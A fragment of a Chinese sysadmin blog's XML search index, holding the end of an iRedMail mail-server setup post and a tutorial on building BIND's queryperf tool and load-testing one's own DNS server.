&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;foxmail新建一个账号，输入新建的邮箱用户名和密码。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;接下来，进行发收邮件的测试。这时收件时速度有些慢，更改以下文件： 123[root@linux iRedMail-0.9.0]# vim /etc/policyd/cluebringer.conf 注释#Greylisting //灰名单[root@linux iRedMail-0.9.0]# /etc/init.d/postfix restart; /etc/init.d/dovecot restart;/etc/init.d/cbpolicyd restart iredmail增加域&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;5d6d.com MX mail.lishiming.net. //解析 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;浏览器访问：https://mail.lishiming.net/iredadmin //Add–Domain 增加一个域。5d6d.com &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;之后Add增加一个邮箱用户名lishiming@5d6d.com &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在foxmail上右上角–账号管理–增加账号 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;测试收发邮件。]]></content>
      <tags>
        <tag>DNS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DNS服务器(五)：使用queryperf对DNS服务器作压力测试]]></title>
    <url>%2F2017%2F08%2F10%2FDns%E3%80%81Iredmaill%2F11.%20DNS%E6%9C%8D%E5%8A%A1%E5%99%A8(%E4%BA%94)%EF%BC%9A%E4%BD%BF%E7%94%A8queryperf%E5%AF%B9DNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BD%9C%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95%2F</url>
    <content type="text"><![CDATA[DNS服务器(五)：使用queryperf对DNS服务器作压力测试一、querperf简介&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当我们把DNS服务器配置好后，我们肯定会想测试一下DNS服务器的性能如何，上线后如果请求数够多服务器还能否响应？于是，我们可以使用软件模拟环境，对DNS服务器作评估性的测试。在bind中，有一款自带的压力测试软件，queryperf。使用这款软件可以对DNS服务器作请求测试，并且使用方法简单，我们可以使用queryperf测试多次，取一个平均值，这样就算结果不准确，也不会和实际情况相差太大。 二、queryperf安装 queryperf是bind自带的测试软件，所以我们直接上官网下载bind，解压后就能找到queryperf的安装包。 1wget http://www.isc.org/downloads/file/bind-9-8-7rc2/?version=tar.gz %EF%BC%9A%E4%BD%BF%E7%94%A8queryperf%E5%AF%B9DNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BD%9C%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95/01.jpeg?raw=true) 不知道为什么，这个文件下载完成后的名字是这个，index.html\?version\=tar.gz，好吧我们解压吧。 1tar xf index.html\?version\=tar.gz 解压后，找到目录 contrib ，bind自带的第三方软件全在这个目录里面，我们要用到的queryperf也在里面。 %EF%BC%9A%E4%BD%BF%E7%94%A8queryperf%E5%AF%B9DNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BD%9C%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95/02.jpeg?raw=true) 进入queryperf目录，开始编译安装。可以使用 ./configure -h 查看安装帮助，不过我们默认安装就行了。 1./configure %EF%BC%9A%E4%BD%BF%E7%94%A8queryperf%E5%AF%B9DNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BD%9C%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95/03.jpeg?raw=true) 1make %EF%BC%9A%E4%BD%BF%E7%94%A8queryperf%E5%AF%B9DNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BD%9C%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95/04.jpeg?raw=true) 通过上面的编译后，展开queryperf目录，在该目录下已经生成了一个queryperf的可执行文件。这个文件就是我们要用到的程序，我们把该程序移动到/usr/bin/目录下就可以使用了。 1cp queryperf /usr/bin/ %EF%BC%9A%E4%BD%BF%E7%94%A8queryperf%E5%AF%B9DNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BD%9C%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95/05.jpeg?raw=true) 三、使用queryperf测试DNS服务器&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在测试之前，我们先把DNS服务器架设好。我们以域名wubinary.com为例，架设DNS服务器,dns.wubinary.com。 wubinary.com区域的资源记录文件wubinary.com.zone内容如下。 %EF%BC%9A%E4%BD%BF%E7%94%A8queryperf%E5%AF%B9DNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BD%9C%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95/06.jpeg?raw=true) 测试DNS服务器能否正常使用。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;重新启动服务： %EF%BC%9A%E4%BD%BF%E7%94%A8queryperf%E5%AF%B9DNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BD%9C%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95/07.jpeg?raw=true) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;测试域名blog.wubinary.com %EF%BC%9A%E4%BD%BF%E7%94%A8queryperf%E5%AF%B9DNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BD%9C%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95/08.jpeg?raw=true) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;DNS服务器工作正常，接下来可以使用queryperf作压力测试了。 queryperf使用格式： 1queryperf [-d datafile] [-s server_addr] [-p port] [-q num_queries] -d: 后面接上一个文件，文件的内容是用户对DNS的请求，一行为一条请求，所以为了测试，我们可以在里面写上几千几万条。 -s: DNS服务器地址 -p: DNS服务器端口 -q: 请求多少次 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用vim命令先创建一个请求文件：vim querytest.txt %EF%BC%9A%E4%BD%BF%E7%94%A8queryperf%E5%AF%B9DNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BD%9C%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95/09.jpeg?raw=true) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这几条记录还远远不够，我们使用vim命令 1,$y 复制一下。 %EF%BC%9A%E4%BD%BF%E7%94%A8queryperf%E5%AF%B9DNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BD%9C%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95/10.jpeg?raw=true) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;六百多万条了，开始测试吧。 性能测试。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;执行命令： 1queryperf -d querytest.txt -s 192.168.0.6 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;此时使用top命令可以看到CPU和内存的使用率。 %EF%BC%9A%E4%BD%BF%E7%94%A8queryperf%E5%AF%B9DNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BD%9C%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95/11.jpeg?raw=true) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;结果如下： %EF%BC%9A%E4%BD%BF%E7%94%A8queryperf%E5%AF%B9DNS%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BD%9C%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95/12.jpeg?raw=true) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;测试过程完成，可以多测试几次取平均值。 四、性能测试总结 在作服务器的性能测试时，最好不要在服务器平台自身使用测试软件测试，最好换另外一台机器，这样CPU处理的结果会更准确。 测试时先预估平台会遇到的最大请求数，用这个请求数作测试，量力而为，因为如果服务器遇到大流量的DDOS，单一机器性能再好，也扛不住。 使用queryperf作性能测试时，最好测试多次，取平均值。 可以修改配置文件的部分参数测试，如，开启递归，开启查询日志等功能作测试。 其它开源测试工具，tcpcopy]]></content>
      <tags>
        <tag>DNS</tag>
      </tags>
  </entry>
</search>
